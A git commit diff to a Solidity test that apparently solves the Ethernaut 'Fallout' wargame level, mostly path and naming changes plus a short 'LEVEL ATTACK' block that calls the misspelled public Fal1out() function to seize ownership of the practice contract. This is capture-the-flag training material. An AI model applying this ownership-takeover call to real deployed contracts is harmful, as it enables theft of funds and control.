fa8c303818531ab68ab7905c94ec08edfce64d8c
clement-ux <clemmoller@gmail.com>
2023-01-31 09:56:02 +0100

    02-Fallout

--- src/test/personnal/Fallout.t.sol
+++ src/test/personnal/Fallout.t.sol
@@ -1,11 +1,11 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../02-Fallout/FalloutFactory.sol";
-import "../Ethernaut.sol";
-import "./utils/vm.sol";
+import "src/02-Fallout/FalloutFactory.sol";
+import "src/Ethernaut.sol";
+import "../utils/vm.sol";
 
-contract FalloutTest is DSTest {
+contract C_FalloutTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
     address eoaAddress = address(100);
@@ -32,10 +32,9 @@ contract FalloutTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Call Fal1out constructor function with some value, mispelling enables us to call it - log owner before and after  
-        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.owner());
-        ethernautFallout.Fal1out{value: 1 wei}();
-        emit log_named_address("Fallout Owner After Attack", ethernautFallout.owner());
+        emit log_named_address("owner :", ethernautFallout.owner());
+        ethernautFallout.Fal1out();
+        emit log_named_address("owner :", ethernautFallout.owner());
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -43,6 +42,6 @@ contract FalloutTest is DSTest {
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+        assertTrue(levelSuccessfullyPassed);
     }
 }
